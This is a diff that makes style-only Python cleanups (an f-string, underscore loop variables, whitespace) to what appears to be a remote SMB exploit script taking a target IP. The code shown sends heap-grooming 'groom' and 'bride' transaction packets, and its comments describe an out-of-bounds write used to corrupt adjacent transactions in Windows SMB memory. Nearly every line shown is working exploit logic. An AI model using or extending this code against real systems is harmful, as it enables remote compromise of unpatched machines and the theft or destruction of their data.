@@ -20,7 +20,7 @@ USERNAME = ''
 PASSWORD = ''
 
 if len(sys.argv) != 2:
-	print("{} <ip>".format(sys.argv[0]))
+	print(f"{sys.argv[0]} <ip>")
 	sys.exit(1)
 
 target = sys.argv[1]
@@ -63,7 +63,7 @@ data = resp['Data'][1+6+2:]  # skip padding, parameter, padding
 # ================================
 print('sending packet')
 # send 10 groom packets
-for i in range(10):
+for _ in range(10):
 	conn.send_trans(pack('<HH', 0x36, fid), totalDataCount=0x5400, maxSetupCount=0, maxParameterCount=0, maxDataCount=0)
 
 mids = []
@@ -71,7 +71,7 @@ pids = []
 for i in range(3):
 	mid = conn.next_mid()
 	pid = conn._pid - i - 1
-	
+
 	# req1 is for leak bride transaction
 	req1 = conn.create_trans_packet(pack('<HH', 0x23, fid), mid=mid, totalDataCount=1, maxParameterCount=0x5400, maxSetupCount=0)
 	# req2 is for modify bride transaction, next to this groom, with OOB write
@@ -79,17 +79,17 @@ for i in range(3):
 	# req3 is for ?
 	req3 = conn.create_trans_packet(pack('<HH', 0x36, fid), totalDataCount=0x5400, maxSetupCount=0, maxParameterCount=0, maxDataCount=0)
 	conn.send_raw(req1+req2+req3)
-	
+
 	mids.append(mid)
 	pids.append(pid)
 
-for i in range(len(mids)):
+for _ in mids:
 	conn.recvSMB()
 
 # normally, small transaction is allocated from lookaside which force all buffer size to 0x5000
 # the only method to get small buffer size is sending SMB_COM_TRANSACTION command with empty setup
 # send 48 bride packets
-for i in range(48):
+for _ in range(48):
 	conn.send_trans('', totalDataCount=0x40, maxSetupCount=0, maxParameterCount=0x940, maxDataCount=0)
 
 # now, bride transactions should be next to groom transactions
